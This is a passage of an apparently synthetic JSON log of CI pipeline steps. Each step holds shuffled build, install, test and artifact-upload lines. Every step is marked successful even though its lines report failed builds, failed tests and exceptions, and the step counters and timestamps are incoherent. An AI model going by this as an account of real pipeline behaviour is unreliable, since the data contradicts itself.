          "  PASS: test_auth_login (37ms)",
          "Installing eslint@1.6.0",
          "Step 8/10: Building",
          "Installing lodash@1.0.0",
          "Installing jest@2.19.0",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Step 6/10: Building",
          "[12:00:34] WARN: Deprecated API usage",
          "Cache hit for key-9076",
          "\u2713 build completed",
          "  PASS: test_db_connect (144ms)",
          "  PASS: test_auth_login (265ms)",
          "Cache hit for key-2570",
          "[12:00:34] WARN: Deprecated API usage",
          "  PASS: test_api_health (103ms)",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Installing axios@1.1.0",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Step 7/10: Building",
          "Cache hit for key-3238",
          "  PASS: test_api_health (171ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "WARNING: webpack has known vulnerabilities",
          "Installing lodash@3.8.0",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (50MB)",
          "  PASS: test_user_create (37ms)",
          "Cache hit for key-6084",
          "Compiling src/handler.rs...",
          "Step 4/10: Building",
          "  PASS: test_db_connect (67ms)",
          "  PASS: test_user_create (116ms)",
          "\u2713 test completed",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-20T12:01:12.519070",
        "finished_at": "2025-12-20T12:01:16.321223",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Cache hit for key-7361",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-1135",
          "Cache hit for key-6414",
          "Compiling src/index.js...",
          "  PASS: test_db_connect (380ms)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "\u2713 test completed",
          "Cache hit for key-3021",
          "Installing eslint@3.1.0",
          "Installing axios@3.19.0",
          "Cache hit for key-5154",
          "  PASS: test_db_connect (309ms)",
          "Cache hit for key-1988",
          "\u2713 build completed",
          "Cache hit for key-9322",
          "Installing axios@2.7.0",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "  PASS: test_cache_hit (488ms)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Step 10/10: Building",
          "Compiling src/utils.go...",
          "Compiling src/index.js...",
          "Cache hit for key-8415",
          "Compiling src/handler.rs...",
          "Cache hit for key-7270",
          "  PASS: test_user_create (277ms)",
          "Installing lodash@5.6.0",
          "Compiling src/app.ts...",
          "Compiling src/app.ts...",
          "[12:00:34] INFO: Processing request",
          "Installing jest@5.18.0",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Compiling src/app.ts...",
          "Installing lodash@5.18.0",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-1051",
          "  PASS: test_api_health (37ms)",
          "  PASS: test_db_connect (410ms)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-1451",
          "Cache hit for key-4078",
          "Compiling src/index.js...",
          "[12:00:34] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "WARNING: lodash has known vulnerabilities",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (14MB)",
          "FAILED: test_cache_hit",
          "  PASS: test_db_connect (63ms)",
          "  PASS: test_db_connect (325ms)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Compiling src/main.py...",
          "Installing webpack@2.3.0",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "Cache hit for key-3519",
          "Artifact uploaded: build.tar.gz (22MB)",
          "  PASS: test_api_health (490ms)",
          "Step 1/10: Building",
          "Installing axios@3.1.0",
          "[12:00:34] INFO: Processing request",
          "Compiling src/main.py...",
          "  PASS: test_user_create (372ms)",
          "Step 9/10: Building",
          "  PASS: test_api_health (219ms)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-3552",
          "  PASS: test_auth_login (482ms)",
          "Compiling src/app.ts...",
          "[12:00:34] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Compiling src/handler.rs...",
          "[12:00:34] INFO: Processing request",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (123ms)",
          "Compiling src/main.py...",
          "Cache hit for key-4931",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_db_connect (187ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_cache_hit (471ms)",
          "Installing axios@3.6.0",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Step 8/10: Building",
          "Cache hit for key-6824",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "Installing axios@5.18.0",
          "Compiling src/handler.rs...",
          "[12:00:34] INFO: Processing request",
          "Step 9/10: Building",
          "[12:00:34] INFO: Processing request",
          "Installing webpack@5.7.0",
          "Installing lodash@2.8.0",
          "Artifact uploaded: build.tar.gz (10MB)",
          "  PASS: test_cache_hit (325ms)",
          "Cache hit for key-7015",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "  PASS: test_api_health (34ms)",
          "Cache hit for key-3493",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Installing lodash@3.8.0",
          "Installing react@3.7.0",
          "Compiling src/handler.rs...",
          "Installing express@3.19.0",
          "[12:00:34] ERROR: Connection failed",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_db_connect (299ms)",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (10MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Compiling src/service.java...",
          "[12:00:34] INFO: Processing request",
          "Step 2/10: Building",
          "Installing prettier@4.18.0",
          "Compiling src/handler.rs...",
          "Step 7/10: Building",
          "Installing webpack@4.8.0",
          "[12:00:34] INFO: Processing request",
          "FAILED: test_auth_login",
          "Installing webpack@1.10.0",
          "Installing react@1.15.0",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "[12:00:34] ERROR: Connection failed",
          "Step 6/10: Building",
          "Cache hit for key-9252",
          "Step 6/10: Building",
          "\u2713 build completed",
          "\u2713 test completed",
          "\u2717 build failed with exit code 55",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (481ms)",
          "Cache hit for key-4841",
          "Compiling src/app.ts...",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "\u2713 test completed",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Installing lodash@2.4.0",
          "Installing eslint@5.4.0",
          "[12:00:34] INFO: Processing request",
          "Installing react@3.4.0",
          "Artifact uploaded: build.tar.gz (15MB)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:00:34] INFO: Processing request",
          "Installing webpack@2.3.0",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "Compiling src/main.py...",
          "  PASS: test_user_create (404ms)",
          "[12:00:34] INFO: Processing request",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing eslint@3.19.0",
          "  PASS: test_cache_hit (274ms)",
          "  PASS: test_auth_login (303ms)",
          "  PASS: test_api_health (129ms)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Step 3/10: Building",
          "Cache hit for key-3532",
          "Artifact uploaded: build.tar.gz (43MB)",
          "\u2713 test completed",
          "Cache hit for key-6780",
          "  PASS: test_api_health (352ms)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-3528",
          "  PASS: test_db_connect (149ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-20T12:01:16.321223",
        "finished_at": "2025-12-20T12:01:25.826606",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Cache hit for key-9828",
          "Cache hit for key-5927",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Cache hit for key-1162",
          "\u2717 build failed with exit code 84",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 4/10: Building",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (212ms)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "  PASS: test_auth_login (468ms)",
          "\u2713 lint completed",
          "  PASS: test_auth_login (198ms)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_user_create (431ms)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Installing react@2.1.0",
          "[12:00:34] WARN: Deprecated API usage",
          "  PASS: test_db_connect (131ms)",
          "Step 3/10: Building",
          "  PASS: test_user_create (325ms)",
          "Installing eslint@1.2.0",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "Compiling src/app.ts...",
          "Compiling src/service.java...",
          "[12:00:34] INFO: Processing request",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (333ms)",
          "  PASS: test_api_health (387ms)",
          "Compiling src/main.py...",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Installing eslint@5.18.0",
          "  PASS: test_user_create (431ms)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Installing react@1.3.0",
          "Step 6/10: Building",
          "Compiling src/handler.rs...",
          "Compiling src/app.ts...",
          "Step 5/10: Building",
          "Step 4/10: Building",
          "[12:00:34] INFO: Processing request",
          "Installing prettier@2.4.0",
          "[12:00:34] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (34MB)",
          "\u2713 build completed",
          "Step 9/10: Building",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (40MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "  PASS: test_user_create (13ms)",
          "[12:00:34] INFO: Processing request",
          "Step 2/10: Building",
          "Installing eslint@3.20.0",
          "Exception: TypeError",
          "Compiling src/index.js...",
          "  PASS: test_auth_login (476ms)",
          "  PASS: test_auth_login (15ms)",
          "[12:00:34] INFO: Processing request",
          "Installing axios@5.3.0",
          "\u2713 build completed",
          "  PASS: test_api_health (393ms)",
          "Step 9/10: Building",
          "Step 4/10: Building",
          "Installing react@4.2.0",
          "  PASS: test_user_create (486ms)",
          "Cache hit for key-2221",
          "[12:00:34] WARN: Deprecated API usage",
          "[12:00:34] ERROR: Connection failed",
          "\u2713 lint completed",
          "Step 5/10: Building",
          "[12:00:34] INFO: Processing request",
          "Exception: RuntimeError",
          "Step 4/10: Building",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "WARNING: eslint has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Cache hit for key-9057",
          "Cache hit for key-9830",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Installing axios@5.0.0",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:00:34] INFO: Processing request",
          "Step 3/10: Building",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (40MB)",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_cache_hit (256ms)",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Step 3/10: Building",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Installing prettier@3.0.0",
          "Installing lodash@4.18.0",
          "Artifact uploaded: build.tar.gz (21MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Compiling src/handler.rs...",
          "[12:00:34] INFO: Processing request",
          "Installing prettier@3.12.0",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "FAILED: test_db_connect",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "Installing axios@3.1.0",
          "[12:00:34] INFO: Processing request",
          "Step 7/10: Building",
          "  PASS: test_auth_login (168ms)",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Cache hit for key-9792",
          "Cache hit for key-7813",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 1/10: Building",
          "\u2713 build completed",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Installing jest@2.10.0",
          "Cache hit for key-6548",
          "Compiling src/app.ts...",
          "WARNING: axios has known vulnerabilities",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "Installing express@2.15.0",
          "\u2713 lint completed",
          "Cache hit for key-1413",
          "  PASS: test_cache_hit (391ms)",
          "Cache hit for key-5699",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:34] INFO: Processing request",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u2717 build failed with exit code 98",
          "Compiling src/service.java...",
          "\u2717 build failed with exit code 81",
          "  PASS: test_cache_hit (161ms)",
          "WARNING: jest has known vulnerabilities",
          "Installing webpack@2.8.0",
          "Installing express@4.17.0",
          "[12:00:34] INFO: Processing request",
          "Step 4/10: Building",
          "\u2713 test completed",
          "Step 4/10: Building",
          "[12:00:34] INFO: Processing request",
          "Step 4/10: Building",
          "Step 6/10: Building",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-5500",
          "[12:00:34] INFO: Processing request",
          "Step 10/10: Building",
          "Cache hit for key-1277",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Cache hit for key-6680",
          "\u2717 build failed with exit code 2",
          "  PASS: test_user_create (47ms)",
          "Step 1/10: Building",
          "  PASS: test_cache_hit (466ms)",
          "[12:00:34] WARN: Deprecated API usage",
          "  PASS: test_api_health (156ms)",
          "[12:00:34] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Cache hit for key-4276",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "\u2717 build failed with exit code 100",
          "  PASS: test_db_connect (338ms)",
          "Compiling src/index.js...",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-8529",
          "Step 7/10: Building",
          "Step 10/10: Building",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_api_health (27ms)",
          "Step 6/10: Building",
          "Installing react@2.10.0",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "Cache hit for key-3295",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-20T12:01:25.826606",
        "finished_at": "2025-12-20T12:01:35.331989",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Installing prettier@5.18.0",
          "\u2713 lint completed",
          "Installing react@1.1.0",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/main.py...",
          "Step 6/10: Building",
          "Installing prettier@2.12.0",
          "Installing react@5.11.0",
          "Cache hit for key-8391",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Compiling src/index.js...",
          "FAILED: test_db_connect",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_user_create (232ms)",
          "Step 6/10: Building",
          "Step 3/10: Building",
          "Compiling src/handler.rs...",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (321ms)",
          "\u2713 lint completed",
          "Step 4/10: Building",
          "  PASS: test_cache_hit (186ms)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Compiling src/utils.go...",
          "Step 2/10: Building",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: axios has known vulnerabilities",
          "Installing react@1.18.0",
          "Step 8/10: Building",
          "Installing webpack@1.16.0",
          "Step 4/10: Building",
          "\u2713 test completed",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "Installing lodash@1.18.0",
          "Compiling src/service.java...",
          "Cache hit for key-4861",
          "[12:00:34] INFO: Processing request",
          "Compiling src/handler.rs...",
          "[12:00:34] WARN: Deprecated API usage",
          "Cache hit for key-5203",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-6485",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Step 6/10: Building",
          "[12:00:34] INFO: Processing request",
          "Step 2/10: Building",
          "[12:00:34] INFO: Processing request",
          "Installing axios@1.10.0",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (418ms)",
          "[12:00:34] INFO: Processing request",
          "Step 1/10: Building",
          "Step 5/10: Building",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Step 9/10: Building",
          "[12:00:34] INFO: Processing request",
          "FAILED: test_auth_login",
          "\u2713 build completed",
          "Installing jest@4.12.0",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Installing express@4.6.0",
          "[12:00:34] INFO: Processing request",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:00:34] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Installing react@1.17.0",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (45MB)",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Cache hit for key-5180",
          "  PASS: test_api_health (130ms)",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_api_health (376ms)",
          "Cache hit for key-6210",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "Compiling src/main.py...",
          "  PASS: test_user_create (83ms)",
          "  PASS: test_user_create (248ms)",
          "Installing express@2.20.0",
          "Step 3/10: Building",
          "Cache hit for key-6913",
          "\u2713 test completed",
          "\u2713 test completed",
          "Cache hit for key-4815",
          "\u2713 lint completed",
          "Step 7/10: Building",
          "Step 5/10: Building",
          "\u2713 test completed",
          "Step 3/10: Building",
          "Step 1/10: Building",
          "Step 3/10: Building",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Step 6/10: Building",
          "Installing lodash@5.16.0",
          "Installing lodash@5.13.0",
          "Artifact uploaded: build.tar.gz (6MB)",
          "  PASS: test_auth_login (219ms)",
          "  PASS: test_auth_login (143ms)",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "  PASS: test_db_connect (307ms)",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (486ms)",
          "\u2713 test completed",
          "Exception: RuntimeError",
          "Exception: NullPointerException",
          "  PASS: test_api_health (193ms)",
          "\u2717 build failed with exit code 107",
          "Artifact uploaded: build.tar.gz (47MB)",
          "  PASS: test_auth_login (386ms)",
          "Step 3/10: Building",
          "Compiling src/index.js...",
          "Step 8/10: Building",
          "Cache hit for key-5444",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-3915",
          "Step 4/10: Building",
          "[12:00:34] INFO: Processing request",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "  PASS: test_auth_login (480ms)",
          "  PASS: test_db_connect (319ms)",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-1375",
          "Installing jest@4.6.0",
          "\u2713 test completed",
          "  PASS: test_api_health (306ms)",
          "Compiling src/app.ts...",
          "Step 3/10: Building",
          "\u2713 test completed",
          "FAILED: test_api_health",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (6MB)",
          "[12:00:34] INFO: Processing request",
          "FAILED: test_db_connect",
          "Cache hit for key-7848",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Installing prettier@3.13.0",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (48ms)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Installing prettier@3.5.0",
          "  PASS: test_user_create (480ms)",
          "[12:00:34] ERROR: Connection failed",
          "Installing lodash@1.15.0",
          "Compiling src/index.js...",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (175ms)",
          "Step 4/10: Building",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Installing axios@1.9.0",
          "[12:00:34] INFO: Processing request",
          "Step 2/10: Building",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Cache hit for key-5621",
          "Installing lodash@3.15.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-7298",
          "[12:00:34] INFO: Processing request",
          "Installing express@3.0.0",
          "\u2713 test completed",
          "[12:00:34] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-20T12:01:35.331989",
        "finished_at": "2025-12-20T12:02:03.848138",
        "log_lines": [
          "=== Step: build ===",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_db_connect (316ms)",
          "  PASS: test_cache_hit (78ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (30MB)",
          "\u2717 build failed with exit code 91",
          "  PASS: test_cache_hit (7ms)",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-8212",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "[12:00:34] ERROR: Connection failed",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Installing react@5.7.0",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_auth_login (360ms)",
          "[12:00:34] INFO: Processing request",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache hit for key-3811",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "Compiling src/utils.go...",
          "Installing eslint@2.13.0",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Exception: ValueError",
          "Installing axios@2.16.0",
          "Compiling src/handler.rs...",
          "WARNING: webpack has known vulnerabilities",
          "Step 10/10: Building",
          "Cache hit for key-2353",
          "  PASS: test_user_create (431ms)",
          "Installing webpack@2.3.0",
          "Cache hit for key-9400",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Installing lodash@1.18.0",
          "WARNING: eslint has known vulnerabilities",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Compiling src/handler.rs...",
          "  PASS: test_auth_login (241ms)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-1149",
          "Step 10/10: Building",
          "[12:00:34] INFO: Processing request",
          "Compiling src/main.py...",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (418ms)",
          "  PASS: test_user_create (158ms)",
          "Cache hit for key-2495",
          "Compiling src/handler.rs...",
          "Cache hit for key-8548",
          "Installing express@2.6.0",
          "Installing webpack@2.17.0",
          "[12:00:34] INFO: Processing request",
          "Exception: TypeError",
          "Installing express@3.7.0",
          "  PASS: test_api_health (311ms)",
          "Cache hit for key-5314",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (355ms)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "[12:00:34] WARN: Deprecated API usage",
          "Cache hit for key-6825",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Cache hit for key-5861",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] WARN: Deprecated API usage",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Exception: RuntimeError",
          "Step 8/10: Building",
          "Cache hit for key-3100",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing prettier@5.3.0",
          "[12:00:34] INFO: Processing request",
          "Step 2/10: Building",
          "\u2713 test completed",
          "Step 8/10: Building",
          "Step 8/10: Building",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "Installing jest@3.5.0",
          "Artifact uploaded: build.tar.gz (11MB)",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Step 5/10: Building",
          "Cache hit for key-3139",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "  PASS: test_user_create (335ms)",
          "\u2717 build failed with exit code 92",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (193ms)",
          "  PASS: test_cache_hit (194ms)",
          "Step 5/10: Building",
          "Installing react@2.12.0",
          "  PASS: test_user_create (356ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Installing eslint@5.12.0",
          "  PASS: test_cache_hit (118ms)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Installing webpack@1.0.0",
          "Installing jest@3.10.0",
          "WARNING: express has known vulnerabilities",
          "Step 8/10: Building",
          "Compiling src/utils.go...",
          "  PASS: test_cache_hit (82ms)",
          "[12:00:34] WARN: Deprecated API usage",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "Installing lodash@4.12.0",
          "  PASS: test_api_health (46ms)",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:00:34] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Compiling src/app.ts...",
          "Compiling src/handler.rs...",
          "  PASS: test_auth_login (174ms)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 3/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:34] INFO: Processing request",
          "Exception: RuntimeError",
          "Step 1/10: Building",
          "WARNING: eslint has known vulnerabilities",
          "Installing jest@1.12.0",
          "Installing express@5.9.0",
          "Cache hit for key-7004",
          "  PASS: test_api_health (223ms)",
          "Installing eslint@3.15.0",
          "[12:00:34] INFO: Processing request",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "Installing jest@1.1.0",
          "Compiling src/service.java...",
          "Exception: TypeError",
          "Step 2/10: Building",
          "Cache hit for key-9146",
          "Step 1/10: Building",
          "Compiling src/service.java...",
          "Cache hit for key-1735",
          "Artifact uploaded: build.tar.gz (28MB)",
          "  PASS: test_auth_login (16ms)",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (47MB)",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Cache hit for key-4330",
          "Cache hit for key-5183",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_api_health (73ms)",
          "WARNING: jest has known vulnerabilities",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "[12:00:34] INFO: Processing request",
          "FAILED: test_auth_login",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Step 3/10: Building",
          "Compiling src/handler.rs...",
          "Installing lodash@3.2.0",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-4749",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-20T12:02:03.848138",
        "finished_at": "2025-12-20T12:02:13.353521",
        "log_lines": [
          "=== Step: lint ===",
          "  PASS: test_db_connect (204ms)",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (43MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-5890",
          "  PASS: test_cache_hit (78ms)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Installing lodash@2.10.0",
